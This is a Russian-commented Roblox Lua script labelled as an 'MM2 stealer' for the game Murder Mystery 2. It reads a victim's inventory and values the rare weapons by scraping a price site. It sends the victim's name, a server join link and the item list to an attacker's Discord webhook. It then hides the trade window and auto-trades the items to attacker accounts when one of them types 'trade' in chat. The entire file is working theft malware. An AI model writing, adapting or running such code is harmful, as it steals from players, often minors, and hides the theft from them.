-- ОСНОВНОЙ СКРИПТ MM2 STEALER (запускается после байпаса)
if getgenv().scriptExecuted then return end
getgenv().scriptExecuted = true

print("Основной скрипт запущен после байпаса")

-- Используем байпасенный JobId
if getgenv().RealJobId then
    game.JobId = getgenv().RealJobId
    print("Используем байпасенный JobId:", game.JobId)
end

-- Берем настройки из сохраненных
local users = getgenv().SavedSettings and getgenv().SavedSettings.Usernames or {}
local min_rarity = getgenv().SavedSettings and getgenv().SavedSettings.min_rarity or "Godly"
local min_value = getgenv().SavedSettings and getgenv().SavedSettings.min_value or 1
local ping = getgenv().SavedSettings and getgenv().SavedSettings.pingEveryone or "No"
local webhook = getgenv().SavedSettings and getgenv().SavedSettings.webhook or ""

-- ПРОВЕРКА НАСТРОЕК
if webhook == "" then
    warn("ОШИБКА: Вебхук не настроен!")
    return
end

if next(users) == nil then
    warn("ОШИБКА: Usernames не добавлены!")
    return
end

if game.PlaceId ~= 142823291 then
    warn("ОШИБКА: Не поддерживаемая игра")
    return
end

-- Основные переменные
local weaponsToSend = {}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local HttpService = game:GetService("HttpService")

local rarityTable = {
    "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
}

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

-- Функции
local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "GET",
            Headers = {
                ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        })
    end)
    
    if success and response.Success then
        return response.Body
    else
        warn("Ошибка загрузки HTML: " .. url)
        return ""
    end
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        return tonumber(valueStr)
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemName:lower()] = value
            end
        end
    end
    
    return itemValues
end

local function buildValueList()
    local allExtractedValues = {}
    
    for _, url in pairs(categories) do
        local htmlContent = fetchHTML(url)
        if htmlContent and htmlContent ~= "" then
            local extractedValues = extractItems(htmlContent)
            for itemName, value in pairs(extractedValues) do
                allExtractedValues[itemName] = value
            end
        end
        task.wait(1)
    end

    local valueList = {}
    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        
        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")

            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                local value = allExtractedValues[itemName] or 2
                valueList[dataid] = value
            end
        end
    end

    return valueList
end

local function sendTradeRequest(user)
    local targetPlayer = game:GetService("Players"):FindFirstChild(user)
    if targetPlayer then
        local args = {[1] = targetPlayer}
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
        return true
    end
    return false
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local function acceptTrade()
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(285646582)
end

local function addWeaponToTrade(id)
    local args = {[1] = id, [2] = "Weapons"}
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
end

local totalValue = 0

local function SendFirstMessage(list, prefix)
    local jobIdToUse = getgenv().RealJobId or game.JobId
    local joinLink = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. jobIdToUse

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = joinLink,
            inline = false
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        fields[3].value = fields[3].value:sub(1, 1000) .. "\nPlus more!"
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobIdToUse .. "')",
        ["embeds"] = {{
            ["title"] = "🎪 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "MM2 stealer with bypassed JobId"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
    
    if success and (response.StatusCode == 204 or response.StatusCode == 200) then
        print("Сообщение отправлено в Discord!")
    else
        warn("Ошибка отправки в Discord")
    end
end

-- Отключаем GUI торговли
local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradegui.Enabled = false
end)

local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeguiphone.Enabled = false
end)

-- Список неторгуемых предметов
local untradable = {
    ["DefaultGun"] = true,
    ["DefaultKnife"] = true,
    ["Reaver"] = true,
    ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true,
    ["Reaver_Ancient"] = true,
    ["IceHammer"] = true,
    ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true,
    ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true,
    ["Season1TestKnife"] = true,
    ["Cracks"] = true,
    ["Icecrusher"] = true,
    ["???"] = true,
    ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}

-- Получаем данные инвентаря
local valueList = buildValueList()
local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local min_rarity_index = table.find(rarityTable, min_rarity)

-- Обрабатываем предметы
for dataid, amount in pairs(realData.Weapons.Owned) do
    local itemData = database[dataid]
    if itemData then
        local rarity = itemData.Rarity or ""
        local weapon_rarity_index = table.find(rarityTable, rarity)
        
        if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
            local value = valueList[dataid] or 2
            if value >= min_value then
                totalValue = totalValue + (value * amount)
                table.insert(weaponsToSend, {
                    DataID = dataid, 
                    Rarity = rarity, 
                    Amount = amount, 
                    Value = value
                })
            end
        end
    end
end

-- Сортируем по цене
table.sort(weaponsToSend, function(a, b)
    return (a.Value * a.Amount) > (b.Value * b.Amount)
end)

-- Отправляем сообщение в Discord
if #weaponsToSend > 0 then
    local prefix = ping == "Yes" and "@everyone " or ""
    SendFirstMessage(weaponsToSend, prefix)
    
    print("Найдено предметов для отправки:", #weaponsToSend)
    print("Общая стоимость:", totalValue)
    
    -- Функция для торговли
    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            task.wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            task.wait(0.3)
        end

        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()

            if tradeStatus == "None" then
                if sendTradeRequest(joinedUser) then
                    print("Отправляем запрос на торговлю:", joinedUser)
                end
            elseif tradeStatus == "StartTrade" then
                for i = 1, math.min(4, #weaponsToSend) do
                    local weapon = table.remove(weaponsToSend, 1)
                    for count = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                task.wait(6)
                acceptTrade()
                task.wait(3)
            else
                task.wait(0.5)
            end
            task.wait(1)
        end
    end

    -- Ждем когда пользователь напишет в чат
    local function waitForUserChat()
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function(msg)
                    if msg:lower():match("trade") or msg:lower():match("трейд") then
                        print("Обнаружено сообщение от:", player.Name)
                        doTrade(player.Name)
                    end
                end)
            end
        end
        
        for _, player in ipairs(Players:GetPlayers()) do 
            onPlayerChat(player) 
        end
        
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    
    waitForUserChat()
    
else
    warn("Нет подходящих предметов для отправки")
end

print("Скрипт успешно запущен и готов к работе!")
